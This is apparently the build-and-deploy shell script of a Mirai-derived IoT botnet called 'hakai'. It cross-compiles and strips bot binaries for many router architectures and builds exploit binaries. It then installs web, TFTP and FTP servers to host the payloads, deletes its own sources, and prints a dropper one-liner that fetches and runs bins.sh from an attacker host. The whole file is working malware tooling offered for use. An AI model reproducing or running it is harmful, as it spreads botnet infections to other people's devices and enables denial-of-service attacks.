#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords



	FLAGS="-DREKAI_TELNET -DDEBUG"
function compile_bot {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function compile_exploits {
    "$1-gcc" -DREKAI_TELNET -DDEBUG -static -o release/"$2" bot/*.c
}
if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release>"
elif [ "$1" == "release" ]; then
    rm release/*
    mkdir release
    compile_bot i586 hakai.x86 $FLAGS "-static -DDEBUG"
    compile_bot mips hakai.mips $FLAGS "-static"
    compile_bot mipsel hakai.mpsl $FLAGS "-static"
    compile_bot armv4l hakai.arm4 $FLAGS 
    compile_bot armv5l hakai.arm5 $FLAGS 
    compile_bot armv6l hakai.arm6 $FLAGS 
    compile_bot armv7l hakai.arm7 $FLAGS 
    compile_bot powerpc hakai.ppc $FLAGS "-static"
    compile_bot sparc hakai.spc $FLAGS "-static"
    compile_bot m68k hakai.m68k $FLAGS "-static"
    compile_bot sh4 hakai.sh4 $FLAGS "-static"
    compile_exploits i586 hakai.x86_32 $FLAGS "-static"
    compile_exploits x86_64 hakai.x86_64 $FLAGS "-static"
    compile_exploits mips m "-static"
    compile_exploits armv4l ea4
    compile_exploits armv7l ea7
elif [ "$1" == "debug" ]; then
    mkdir debug
	gcc bot/*.c -DDEBUG $FLAGS -static -g -o debug/hakai.dbg
	yum install httpd -y
	service httpd start
	service httpd restart
    yum install xinetd tftp tftp-server -y
    service xinetd start
	yum install vsftpd -y
	service vsftpd start
	service vsftpd restart
	cp debug/hakai.dbg* /var/www/html
	cp bins/bins.sh* /var/www/html
	cp release/hakai* /var/www/html
	cp release/hakai* /var/ftp
	cp bins/bins.sh* /var/ftp
	rm -rf debug
	rm -rf release
    rm -rf bot
    rm -rf build.sh
    rm -rf bins
    service httpd restart	
    echo "ur wget: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ip goes here hehe/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh"
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi